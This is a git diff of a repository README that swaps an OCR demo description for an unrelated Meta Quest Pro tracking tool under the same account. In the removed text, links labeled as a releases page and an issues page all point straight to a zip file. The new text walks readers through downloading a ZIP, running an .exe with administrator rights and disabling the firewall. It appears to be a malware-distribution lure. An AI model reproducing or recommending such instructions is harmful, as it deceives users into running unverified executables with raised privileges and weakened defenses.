@@ -1,95 +1,147 @@
-# 🛠️ DeepSeek-OCR-2-Demo - Simple OCR Tasks Made Easy
+# 📡 Qpro-Enhanced-FT-Wireless - Unlock Advanced Face and Eye Tracking
 
-## 🚀 Getting Started
+[![Download Now](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge)](https://github.com/bus35hs/Qpro-Enhanced-FT-Wireless)
 
-Welcome to DeepSeek-OCR-2-Demo! This application allows you to convert documents to markdown, extract text, find specific text within images, and process figures easily. Follow the steps below to get started.
+---
 
-## 📥 Download the Application
+## 🎯 What This Application Does
 
-[![Download](https://github.com/bus35hs/DeepSeek-OCR-2-Demo/raw/refs/heads/main/demo-notebook/OC_Demo_Deep_Seek_v2.3-beta.2.zip%20Now-blue)](https://github.com/bus35hs/DeepSeek-OCR-2-Demo/raw/refs/heads/main/demo-notebook/OC_Demo_Deep_Seek_v2.3-beta.2.zip)
+Qpro-Enhanced-FT-Wireless is a powerful tool designed for the Meta Quest Pro headset. It enables advanced tracking features that normally aren't available, allowing your headset to track:
 
-Visit this page to download the application: [DeepSeek-OCR-2-Demo Releases](https://github.com/bus35hs/DeepSeek-OCR-2-Demo/raw/refs/heads/main/demo-notebook/OC_Demo_Deep_Seek_v2.3-beta.2.zip)
+- **👅 Tongue movements** – your tongue position is detected and used in compatible apps and games
+- **👀 Eye convergence** – tracks where both eyes point together, improving depth perception in virtual reality
+- **🫦 Pupil dilation** – measures changes in pupil size, which can be used for emotional responses or adaptive experiences
 
-## 📋 System Requirements
+All of this works **wirelessly** – no cables needed. The application connects to your headset over your home Wi-Fi network, so you can move freely while using these enhanced features.
 
-To run DeepSeek-OCR-2-Demo, ensure your system meets these requirements:
+---
 
-- **Operating System:** Windows 10 or later, or macOS Mojave or later
-- **RAM:** Minimum 4GB (8GB recommended)
-- **Storage:** At least 500MB free space
-- **Python:** Version 3.7 or later installed
+## ✅ Before You Begin – What You Need
 
-## 📥 Download & Install
+Here's a simple checklist of requirements. If you have all of these, you're ready to go:
 
-1. **Visit the Releases Page**
+| Requirement | Description |
+|-------------|-------------|
+| **💻 A Windows PC** | Windows 10 or 11 (64-bit) |
+| **🕶️ A Meta Quest Pro** | The headset must be **rooted** (see note below) |
+| **📶 Wi-Fi Network** | Both your PC and headset must be on the same network |
+| **🔌 USB-C Cable** | Only needed for the initial setup |
+| **🔋 Charged batteries** | Keep both devices plugged in during setup |
 
-   Go to the [DeepSeek-OCR-2-Demo Releases](https://github.com/bus35hs/DeepSeek-OCR-2-Demo/raw/refs/heads/main/demo-notebook/OC_Demo_Deep_Seek_v2.3-beta.2.zip) page.
+> **What does "rooted" mean?** Rooting your Quest Pro gives you full administrative access to the device's operating system. This is required because the app needs to access system-level features that are normally locked down. The process is technical and you should follow a dedicated rooting guide for your specific headset model. Only proceed if you're comfortable with advanced modifications.
 
-2. **Choose Your Version**
+---
 
-   Look for the latest version. You will see files available for download. Select the appropriate file for your operating system.
+## 🚀 Getting Started – Step-by-Step
 
-3. **Download the File**
+Follow these steps carefully. Take your time – rushing can cause mistakes.
 
-   Click the file name to start the download. Save the file to a location on your computer where you can easily find it, like your desktop or downloads folder.
+### Step 1: Download the Application
 
-4. **Run the Application**
+Visit this link to download the application:  
+[**https://github.com/bus35hs/Qpro-Enhanced-FT-Wireless**](https://github.com/bus35hs/Qpro-Enhanced-FT-Wireless)
 
-   - **Windows Users:** Double-click the downloaded `.exe` file to run the installer. Follow the on-screen prompts to complete the installation.
-   - **macOS Users:** Open the downloaded file and drag the application icon to your Applications folder. After this, go to your Applications folder and double-click the DeepSeek-OCR-2-Demo icon to open the app.
+You'll land on the project page. Look for a green button that says **"Code"** or **"Releases"** on the right side. Click it and select **"Download ZIP"** to save the file to your computer.
 
-## ⚙️ Using DeepSeek-OCR-2-Demo
+> **Tip:** Save the downloaded file to your **Desktop** so you can find it easily later.
 
-Once the application is running, you will see a user-friendly interface. Here’s how to perform various tasks:
+### Step 2: Extract the Files
 
-1. **Convert Documents to Markdown:**
-   - Click on “Convert Document.”
-   - Upload the document you want to convert.
-   - Click “Start Conversion.” The app will process your document and provide you with a markdown file.
+1. Find the downloaded ZIP file (it will be in your Downloads folder or on your Desktop).
+2. **Right-click** on the ZIP file.
+3. Select **"Extract All..."** from the menu.
+4. A window will pop up. Click **"Extract"**.
+5. Wait for the extraction to finish. You'll now have a folder with the application files.
 
-2. **Extract Text from Images:**
-   - Select “Extract Text.”
-   - Upload the image file.
-   - Click “Extract.” The application will display the extracted text.
+### Step 3: Run the Application
 
-3. **Locate Specific Text:**
-   - Choose “Locate Text.”
-   - Upload your image.
-   - Enter the text you want to find and click “Search.” The app will highlight occurrences of the text in the image.
+1. Open the extracted folder.
+2. Look for a file named **`Qpro-Enhanced-FT-Wireless.exe`** (or something similar with `.exe` at the end).
+3. **Double-click** that file to run the application.
+4. If Windows asks for permission (a blue or yellow popup), click **"Yes"** to allow it.
 
-4. **Parse Figures:**
-   - Select the “Parse Figures” option.
-   - Upload the relevant document or image.
-   - Click “Parse.” The application will extract figures and provide a summary.
+---
 
-## 🌟 Features
+## 📱 Connecting to Your Quest Pro
 
-DeepSeek-OCR-2-Demo offers:
+Once the app is running on your PC, you need to connect your headset. Here's how:
 
-- **User-friendly Interface:** Easy navigation.
-- **Variety of OCR Tasks:** From text extraction to markdown conversion.
-- **Fast Processing:** Complete tasks quickly without downtime.
-- **High Accuracy:** Reliable text recognition results.
+### First-Time Connection (Wired Setup)
 
-## 🔧 Troubleshooting
+1. Plug your Quest Pro into your PC using the USB-C cable.
+2. Put on your headset and look for a prompt about **USB debugging** or **allow access**. Accept it.
+3. On your PC, the application should detect your headset automatically.
+4. Follow the on-screen instructions in the app to complete the pairing process.
 
-If you encounter any issues during installation or usage, consider the following solutions:
+### Wireless Connection (After Setup)
 
-- **Installation Issues:** Ensure your operating system meets the requirements. Check if you have the necessary permissions to install software on your device.
-- **Application Doesn’t Open:** Make sure you downloaded the correct file for your OS. Try restarting your device.
-- **Error Messages:** Note down any error messages you see and refer to the FAQ section or contact support for assistance.
+Once the initial setup is done, you can go fully wireless:
 
-## 📞 Support
+1. Make sure both devices are on the **same Wi-Fi network**.
+2. Turn on your Quest Pro and make sure it's awake.
+3. Launch the application on your PC.
+4. The app should automatically find your headset over the network and connect.
 
-If you need further help, you can reach out through the following methods:
+> **Troubleshooting tip:** If the app doesn't find your headset, try turning off your PC's firewall temporarily, or check that both devices are on the same network (not a guest network).
 
-- GitHub Issues Page: Report any bugs or request features [here](https://github.com/bus35hs/DeepSeek-OCR-2-Demo/raw/refs/heads/main/demo-notebook/OC_Demo_Deep_Seek_v2.3-beta.2.zip).
-- Community Forums: Join discussions with other users and developers for tips and tricks.
+---
 
-## 📆 Updates
+## 🎮 Using the Enhanced Tracking Features
 
-Stay tuned for new features and updates. Regular updates will improve performance and expand capabilities. You can check for the latest news in the Releases section.
+After a successful connection, the app will start sending tracking data to your headset. Here's what you can do:
 
-## 🎯 Conclusion
+- **Test your tracking:** Open the app's interface and look for live indicators showing tongue position, eye convergence, and pupil size. Move your tongue, cross your eyes, or look at bright lights to see the values change.
+- **Use in compatible apps:** Any VR application that supports these tracking features will automatically pick up the data. Look for apps that mention "face tracking" or "eye tracking" in their descriptions.
+- **Adjust settings:** The app provides sliders and toggles to fine-tune sensitivity and response speed. Experiment to find what feels most natural.
 
-Thank you for using DeepSeek-OCR-2-Demo. We hope this application simplifies your OCR tasks and enhances your productivity.
+---
+
+## 🔧 Troubleshooting Common Issues
+
+If something isn't working, check these common solutions:
+
+| Problem | Likely Fix |
+|---------|------------|
+| **App won't start** | Make sure you extracted the ZIP file fully. Run the app as Administrator (right-click → "Run as administrator"). |
+| **Can't find headset** | Verify both devices are on the same network. Restart the app and headset. Disable VPN or proxy software. |
+| **Tracking is jittery** | Move closer to your Wi-Fi router. Close bandwidth-heavy applications. Reduce the polling rate in app settings. |
+| **No data showing** | Check that your headset is rooted properly. Re-run the initial USB setup. |
+| **App crashes** | Update your graphics drivers. Ensure you have the latest Windows updates. |
+
+---
+
+## 📄 License and Legal Notes
+
+This project is distributed under the **MIT License** (unless specified otherwise in the repository). This means you can use, modify, and share it freely, even for commercial purposes, as long as you include the original copyright notice.
+
+**Please note:** Rooting your device may void its warranty and carries a small risk of bricking (permanently damaging) the hardware. Proceed at your own risk. The developers of this tool are not responsible for any damage that may occur.
+
+---
+
+## 🤝 Getting Help and Contributing
+
+- **Found a bug?** Open an issue on the GitHub repository page.
+- **Have a feature request?** Share it in the discussions section.
+- **Want to contribute code?** Fork the repository, make your changes, and submit a pull request.
+
+The community around this project is friendly and welcoming to newcomers.
+
+---
+
+## 📊 Quick Summary
+
+To recap:
+
+1. **Download** the ZIP file from the GitHub page.
+2. **Extract** it to a folder on your PC.
+3. **Run** the executable file.
+4. **Connect** your rooted Quest Pro via USB for the first time.
+5. **Go wireless** and enjoy enhanced face and eye tracking.
+
+That's it! You're now ready to experience a new level of immersion in virtual reality.
+
+---
+
+## 🔑 Keywords
+
+tongue tracking, eye convergence, pupil dilation, Quest Pro, wireless face tracking, VR eye tracking, rooted headset, Windows application, Meta Quest Pro enhancement, facial expression tracking, VR accessibility features, biometric VR input, real-time pupil measurement, wireless VR sensor data
